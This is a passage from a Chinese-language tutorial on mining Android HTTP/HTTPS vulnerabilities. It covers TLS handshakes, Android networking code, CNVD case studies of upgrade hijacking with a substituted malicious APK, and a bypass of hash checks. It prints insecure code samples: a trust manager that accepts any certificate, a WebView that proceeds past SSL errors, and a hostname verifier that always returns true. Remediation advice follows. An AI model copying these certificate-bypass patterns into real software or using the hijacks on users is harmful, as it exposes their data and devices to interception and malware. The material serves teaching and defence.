class="line">加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥</span><br></pre></td></tr></table></figure><p>因此，HTTPs &#x3D; HTTP + TLS&#x2F;SSL</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/10.png" alt="image-20211204165055568"></p><h4 id="（2）HTTPs的单向认证和双向认证"><a href="#（2）HTTPs的单向认证和双向认证" class="headerlink" title="（2）HTTPs的单向认证和双向认证"></a>（2）HTTPs的单向认证和双向认证</h4><h5 id="lt-1-gt-单向认证"><a href="#lt-1-gt-单向认证" class="headerlink" title="&lt;1&gt;单向认证"></a>&lt;1&gt;单向认证</h5><p>Https在建立Socket连接之前，需要进行握手，具体流程：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/11.png" alt="image-20211204165055568"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</span><br><span class="line"><span class="number">2.</span>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</span><br><span class="line"><span class="number">3.</span>客户端使用服务端返回的信息验证服务器的合法性，包括：</span><br><span class="line">    (<span class="number">1</span>)证书是否过期</span><br><span class="line">    (<span class="number">2</span>)发型服务器证书的CA是否可靠</span><br><span class="line">    (<span class="number">3</span>)返回的公钥是否能正确解开返回证书中的数字签名</span><br><span class="line">    (<span class="number">4</span>)服务器证书上的域名是否和服务器的实际域名相匹配、验证通过后，将继续进行通信，否则，终止通信</span><br><span class="line"><span class="number">4.</span>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</span><br><span class="line"><span class="number">5.</span>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。</span><br><span class="line"><span class="number">6.</span>服务器将选择好的加密方案通过明文方式返回给客户端</span><br><span class="line"><span class="number">7.</span>客户端接收服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器</span><br><span class="line"><span class="number">8.</span>服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-双向认证"><a href="#lt-2-gt-双向认证" class="headerlink" title="&lt;2&gt;双向认证"></a>&lt;2&gt;双向认证</h5><p>双向认证和单向认证原理基本差不多，只是除了客户端需要认证服务端以外，增加了服务端对客户端的认证，具体过程如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/12.png" alt="image-20211204165055568"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</span><br><span class="line"><span class="number">2.</span>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</span><br><span class="line"><span class="number">3.</span>客户端使用服务端返回的信息验证服务器的合法性，包括：</span><br><span class="line">    (<span class="number">1</span>)证书是否过期</span><br><span class="line">    (<span class="number">2</span>)发型服务器证书的CA是否可靠</span><br><span class="line">    (<span class="number">3</span>)返回的公钥是否能正确解开返回证书中的数字签名</span><br><span class="line">    (<span class="number">4</span>)服务器证书上的域名是否和服务器的实际域名相匹配、验证通过后，将继续进行通信，否则，终止通信</span><br><span class="line"><span class="number">4.</span>服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端</span><br><span class="line"><span class="number">5.</span>验证客户端的证书，通过验证后，会获得客户端的公钥</span><br><span class="line"><span class="number">6.</span>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</span><br><span class="line"><span class="number">7.</span>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式</span><br><span class="line"><span class="number">8.</span>将加密方案通过使用之前获取到的公钥进行加密，返回给客户端</span><br><span class="line"><span class="number">9.</span>客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端</span><br><span class="line"><span class="number">10.</span>服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</span><br></pre></td></tr></table></figure><h3 id="4-Android-Http网络开发"><a href="#4-Android-Http网络开发" class="headerlink" title="4.Android Http网络开发"></a>4.Android Http网络开发</h3><p>我们要学习Https通信漏洞挖掘，首先就需要掌握基本的Android http网络开发，因为开发和逆向漏洞总是相互相成的，Android 的HTTP的网络通信框架一般包括两类：第一类是原生的Android网络HTTP通信库，原生网路通信库主要通过HttpURLConnection以及HttpClient两个类完成，但是Android6.0后，Andriod中的SDK就去掉了HttpClient的支持，Android 9后，Android就直接取消了HttpClient的支持，但是由于网络通信的操作涉及异步、多线程和效率的问题，HttpURLConnection中并未对这些操作进行完整的封装，就出现第二类网络通信框架——第三方HTTP(s)的网络请求框架，一般为：okhttp、Volley等，这里我们只介绍当下使用比较广泛的框架</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/13.png" alt="image-20211205134303663"></p><h4 id="（1）HttpURLConnection"><a href="#（1）HttpURLConnection" class="headerlink" title="（1）HttpURLConnection"></a>（1）HttpURLConnection</h4><p>获取HttpURLConnection实例，通过openConnection()获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://www,baidu.com&quot;</span>);</span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br></pre></td></tr></table></figure><p>设置HTTP请求使用的方法，<code>GET</code>表示希望从服务器那里获取数据，<code>POST</code>表示提交数据给服务器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">或者</span><br><span class="line">connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br></pre></td></tr></table></figure><p>再就是一些自由定制，如设置连接超时、读取超时的毫秒数、服务器的一些消息头等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connection.setRequestProperty(<span class="string">&quot;token&quot;</span>,<span class="string">&quot;wwanghai&quot;</span>);<span class="comment">//设置请求参数</span></span><br><span class="line">connection.setConnectTimeout(<span class="number">8000</span>);<span class="comment">//设置连接超时时间</span></span><br><span class="line">connection.setReadTimeout(<span class="number">8000</span>);<span class="comment">//设置接收超时时间</span></span><br></pre></td></tr></table></figure><p>调用getInputStream()方法获取服务器返回的输入流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> connection.getInputStream();</span><br></pre></td></tr></table></figure><p>我们可以用字节数组保存读取的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">bufferSize</span> <span class="operator">=</span> <span class="number">1024</span>;</span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[bufferSize];</span><br><span class="line"><span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"><span class="keyword">while</span> (in.read(buffer)!=-<span class="number">1</span>)&#123;</span><br><span class="line">     sb.append(<span class="keyword">new</span> <span class="title class_">String</span>(buffer));</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>最后调用disconnect()方法将HTTP连接关闭掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection.disconnect();</span><br></pre></td></tr></table></figure><h4 id="（2）okhttp3"><a href="#（2）okhttp3" class="headerlink" title="（2）okhttp3"></a>（2）okhttp3</h4><p>okHttp的项目主页地址是：<a href="https://github.com/square/okhttp">okHttp</a></p><p>我们需要在项目中添加依赖，编辑app&#x2F;build.gradle文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation(<span class="string">&quot;com.squareup.okhttp3:okhttp:3.12.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>首先创建一个OkHttpClient的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">或者加一些设置</span><br><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">                                        .readTimeout(<span class="number">5</span>, TimeUnit.SECONDS)  <span class="comment">//设置读超时</span></span><br><span class="line">                                        .writeTimeout(<span class="number">5</span>, TimeUnit.SECONDS)  <span class="comment">//设置写超时</span></span><br><span class="line">                                        .connectTimeout(<span class="number">15</span>,TimeUnit.SECONDS) <span class="comment">//设置连接超时</span></span><br><span class="line">                                        .retryOnConnectionFailure(<span class="literal">true</span>) <span class="comment">//是否自动重连</span></span><br><span class="line">                                        .build();</span><br></pre></td></tr></table></figure><p>如果要发起HTTP请求，就需要创建一个Request对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder().build(); <span class="comment">//这是一个空的对象</span></span><br><span class="line">    实际使用中</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                                  .url(<span class="string">&quot;http://www,baidu.com&quot;</span>)</span><br><span class="line">                                  .header(<span class="string">&quot;token&quot;</span>,<span class="string">&quot;wanghai&quot;</span>)</span><br><span class="line">                                  .build();</span><br><span class="line">POST：</span><br><span class="line">    <span class="comment">//需要先构建一个RequestBody来存放待提交的参数，然后再传入Request</span></span><br><span class="line">    <span class="type">RequestBody</span> <span class="variable">requestBody</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FormBody</span>.Builder()</span><br><span class="line">                                            .add(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;damin&quot;</span>)</span><br><span class="line">                                            .add(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">                                            .build();</span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                                  .url(<span class="string">&quot;http://www,baidu.com&quot;</span>)</span><br><span class="line">                                  .post(requestBody)</span><br><span class="line">                                  .build();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用OkHttpClient的newCall()方法来创建一个Call对象，并调用execute()方法来发送请求并获取服务器返回的数据，response对象就是服务器返回的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute();</span><br><span class="line"><span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br></pre></td></tr></table></figure><p>还可以使用异步方式来获取数据，Android中大部分都使用异步方式来获取数据，通过enqueue（）函数产生一次真实的网络请求，通过onResponse（）函数进行回调</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">client.newCall(request).enqueue(<span class="keyword">new</span> <span class="title class_">Callback</span>() &#123;</span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(Call call, IOException e)</span> &#123;</span><br><span class="line">                   call.cancel();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                   <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure><h4 id="（3）各自证书的校验方式"><a href="#（3）各自证书的校验方式" class="headerlink" title="（3）各自证书的校验方式"></a>（3）各自证书的校验方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）根据 app 内置证书 KeyStore 生成 TrustManager 验证</span><br><span class="line">（<span class="number">2</span>）自定义 SSLSocketFactory(org.apache.http.conn.ssl.SSLSocketFactory)实现 TrustManager 验证策略(httpClient)</span><br><span class="line">（<span class="number">3</span>）自定义SSLSocketFactory(javax.net.ssl.SSLSocketFactory)实现TrustManager 验证策略(HttpsURLConnection,OkHttp3)</span><br><span class="line">（<span class="number">4</span>）自定义的 HostnameVerifier 和 X509TrustManager 实现验证</span><br><span class="line">（<span class="number">5</span>）第三方库中的验证，如 OkHttp3 中的 CertificatePinner(证书锁定)</span><br><span class="line">（<span class="number">6</span>）WebView 加载 Https 页面时证书校验出错，停止加载</span><br></pre></td></tr></table></figure><p>下面是比较常见的实现https类的各自证书校验方式：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/30.png" alt="image-20211205163031752"></p><p>下面是证书验证的一些关系示意图，参考链接：<a href="https://docs.oracle.com/javase/6/docs/technotes/guides/security/jsse/JSSERefGuide.html">证书关系</a></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/31.png" alt="image-20211205163311496"></p><p>上图中要进行 SSL 会话，必须先建立一个 SSLSocket 对象，而 SSLSocket 对象是通过 SSLSocketFactory 来管理的，SSLSocketFactory 对象则依赖于 SSLContext ，SSLContext 对象的初始化需要 keyManager、TrustManager 和 SecureRandom。TrustManager 对象是我们后文比较关心的，因为正是 TrustManager 负责证书的校验，对网站进行认证，要想确保数据不被中间人抓包分析，就需要实现这个类进行验证，以保障数据的安全性</p><p>在整个过程中 TrustManager 类专门负责校验证书，可以改写 TrustManager 类，实现对证书对校验或让它不要对证书做校验</p><h2 id="三、HTTP-x2F-HTTPs漏洞分析和复现"><a href="#三、HTTP-x2F-HTTPs漏洞分析和复现" class="headerlink" title="三、HTTP&#x2F;HTTPs漏洞分析和复现"></a>三、HTTP&#x2F;HTTPs漏洞分析和复现</h2><h3 id="1-漏洞的安全种类和危害"><a href="#1-漏洞的安全种类和危害" class="headerlink" title="1.漏洞的安全种类和危害"></a>1.漏洞的安全种类和危害</h3><p>Andoid的网络通信中一般采用http明文传输，或使用SSL&#x2F;TLS协议的https密文传输，对于http明文传输来说自然会导致很多漏洞，例如信息泄露漏洞，升级劫持漏洞，验证码口令泄露漏洞等等，而使用https传输的明文，也存在大量的HTTPs证书不校验漏洞，中间人攻击漏洞等等</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/14.png" alt="image-20211205145836325"></p><h3 id="2-HTTP明文传输漏洞"><a href="#2-HTTP明文传输漏洞" class="headerlink" title="2.HTTP明文传输漏洞"></a>2.HTTP明文传输漏洞</h3><h4 id="（1）漏洞案例"><a href="#（1）漏洞案例" class="headerlink" title="（1）漏洞案例"></a>（1）漏洞案例</h4><h5 id="lt-1-gt-酷我音乐APP存在逻辑缺陷漏洞"><a href="#lt-1-gt-酷我音乐APP存在逻辑缺陷漏洞" class="headerlink" title="&lt;1&gt;酷我音乐APP存在逻辑缺陷漏洞"></a>&lt;1&gt;酷我音乐APP存在逻辑缺陷漏洞</h5><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-45684">酷我音乐APP存在逻辑缺陷漏洞</a></p><p>漏洞原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">酷我音乐APP采用http明文传输，攻击者可以通过利用该漏洞利用代理工具篡改数据包来升级校验，从而导致APP升级过程中恶意软件注入攻击</span><br></pre></td></tr></table></figure><p>漏洞复现：</p><p>我们点击检测新版本，可以抓取对应的响应请求，其中下面的是下载请求</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/15.png" alt="image-20211205145836325"></p><p>然后，我们可以发现程序下载完成后，显示正常的升级界面</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/16.png" alt="image-20211205150811779"></p><p>我们可以知道这条请求就是程序的下载请求，对应的就是下载的apk，我们尝试劫持这条请求，将apk替换成我们的恶意锁机程序</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/17.png" alt="image-20211205150811779"></p><p>下劫持响应请求断点，可以让我们在请求响应前劫持</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/18.png" alt="image-20211205150811779"></p><p>通过HFS文件管理服务器，来模拟请求的服务器</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/19.png" alt="image-20211205150811779"></p><p>注意路径应与apk下载请求url保持一致，域名设置为我们本机的ip地址</p><p>重新安装，开始升级</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/20.png" alt="image-20211205150811779"></p><p>然后升级手机被恶意软件劫持</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/21.png" alt="image-20211205150811779"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/22.png" alt="image-20211205150811779"></p><h5 id="lt-2-gt-上海任意门科技有限公司Soul-APP存在信息泄露漏洞"><a href="#lt-2-gt-上海任意门科技有限公司Soul-APP存在信息泄露漏洞" class="headerlink" title="&lt;2&gt; 上海任意门科技有限公司Soul APP存在信息泄露漏洞"></a>&lt;2&gt; 上海任意门科技有限公司Soul APP存在信息泄露漏洞</h5><p><a href="https://www.cnvd.org.cn/user/myreport/4827046">上海任意门科技有限公司Soul APP存在信息泄露漏洞</a></p><p>信息泄露原理很简单就是利用http明文传输，导致一些账户信息、登录信息的泄露，具体大家可以拿一个http传输的样本去测试，然后自己去查看一些信息问题</p><h5 id="lt-3-gt-酷狗直播存在逻辑缺陷漏洞（hash验证）"><a href="#lt-3-gt-酷狗直播存在逻辑缺陷漏洞（hash验证）" class="headerlink" title="&lt;3&gt;酷狗直播存在逻辑缺陷漏洞（hash验证）"></a>&lt;3&gt;酷狗直播存在逻辑缺陷漏洞（hash验证）</h5><p><a href="https://www.cnvd.org.cn/flaw/show/4050696">酷狗直播存在逻辑缺陷漏洞（hash验证）</a></p><p>考虑到http明文传输的危害后，一些厂商开始加入hash验证，这也是我们前面讲述过的验证Android应用的完整性，因为每一个Android APP仅拥有唯一的hash值，但是这种我们可以在升级时，同时去替换相应的hash值来达到升级劫持漏洞的过程</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/23.png" alt="image-20211205150811779"></p><p>我们可以发现在一些厂商的报文中会包含hash值验证，所以如果我们直接去注入恶意程序，我们的应用是安装不上去，但是我们对对应的报文进行替换hash值，替换成我们对于的恶意程序的hash值，我们就可以成功的复现上述升级劫持漏洞的过程</p><h4 id="（2）漏洞防护"><a href="#（2）漏洞防护" class="headerlink" title="（2）漏洞防护"></a>（2）漏洞防护</h4><p>通过上面分析，我们发现上述的漏洞都是因为厂家的APP在传输过程中采用了明文传输导致的，因此防护措施：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）HTTPs加密传输</span><br><span class="line">（<span class="number">2</span>）本地hash验证</span><br></pre></td></tr></table></figure><h3 id="3-HTTPs密文传输漏洞"><a href="#3-HTTPs密文传输漏洞" class="headerlink" title="3.HTTPs密文传输漏洞"></a>3.HTTPs密文传输漏洞</h3><h4 id="（1）漏洞案例-1"><a href="#（1）漏洞案例-1" class="headerlink" title="（1）漏洞案例"></a>（1）漏洞案例</h4><h5 id="lt-1-gt-忽略SSL证书校验漏洞"><a href="#lt-1-gt-忽略SSL证书校验漏洞" class="headerlink" title="&lt;1&gt; 忽略SSL证书校验漏洞"></a>&lt;1&gt; 忽略SSL证书校验漏洞</h5><p>漏洞原理：</p><p>在自定义实现X509TrustManager时，checkServerTrusted中没有检查证书是否可信，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。由于客户端没有校验服务端的证书，因此攻击者就能与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容</p><p>目标程序代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyX509TrustManager</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;  </span><br><span class="line"><span class="comment">// 检查客户端证书  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123; </span><br><span class="line">    <span class="comment">//没有校验的话，就代表接收任意的证书</span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 检查服务器端证书  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123;  </span><br><span class="line">    <span class="comment">//没有校验的话，就代表接收任意的证书</span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 返回受信任的X509证书数组  </span></span><br><span class="line"><span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>在重写WebViewClient的onReceivedSslError方法时，调用proceed忽略证书验证错误信息继续加载页面，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p><p>目标程序代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mywebview.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebviewClient</span>()&#123;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedError</span><span class="params">(WebView view,<span class="type">int</span> errorCode,String description,String falingUrl)</span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// TODO Auto generated method stub  </span></span><br><span class="line">    <span class="built_in">super</span>.onReceivedError(view,errorCode,description,fallingUrl) ;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedSslError</span><span class="params">(WebView view,SslErrorHandler handler,SslError error)</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// T0D0 Auto-generated method stub  </span></span><br><span class="line">    handler.proceed( );  <span class="comment">//不对证书进行处理</span></span><br><span class="line">&#125;;  </span><br><span class="line">&#125;);  </span><br></pre></td></tr></table></figure><p><strong>案例一：京东金融MITM漏洞</strong></p><p>漏洞原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">京东金融Ver 2.8.0由于证书校验有缺陷，导致https中间人攻击，攻击者直接可以获取到会话中敏感数据的加密秘钥，另外由于APP没有做应用加固或混淆，因此可以轻松分析出解密算法，利用获取到的key解密敏感数据</span><br></pre></td></tr></table></figure><p>登录后捕获的数据：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/24.png" alt="image-20211205150811779"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/25.png" alt="image-20211205150811779"></p><p>安全防护：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）建议自定义实现X509TrustManager时，checkServerTrusted中对服务器信息进行严格校验。  </span><br><span class="line">（<span class="number">2</span>）针对自定义TrustManager,检查checkServerTrusted()函数是否为空实现。  </span><br><span class="line">（<span class="number">3</span>）建议不要重写TrustManager 和HostnameVerifier,使用系统默认的。  </span><br><span class="line">（<span class="number">4</span>）在重写WebViewClient的onReceivedSslError方法时，避免调用proceed忽略证书验证。  </span><br><span class="line">（<span class="number">5</span>）禁止使用proceed()函数忽略证书错误，应该抛给系统进行安全警告</span><br></pre></td></tr></table></figure><p>例如，我们在相应的地方加上校验：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/26.png" alt="image-20211205154720291"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/28.png" alt="image-20211205154828588"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/27.png" alt="image-20211205154751251"></p><h5 id="lt-2-gt-忽略域名校验漏洞"><a href="#lt-2-gt-忽略域名校验漏洞" class="headerlink" title="&lt;2&gt;忽略域名校验漏洞"></a>&lt;2&gt;忽略域名校验漏洞</h5><p>在自定义实现HostnameVerifier时，没有在verify中进行严格证书校验，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p><p>目标代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HostnameVerifier</span> <span class="variable">hv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HostnameVerifier</span> ()&#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String hostname,SSLSession session)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>在setHostnameVerifier方法中使用ALLOW_ALL_HOSTNAME _VERIFIER,信任所有Hostname,导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p><p>目标代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 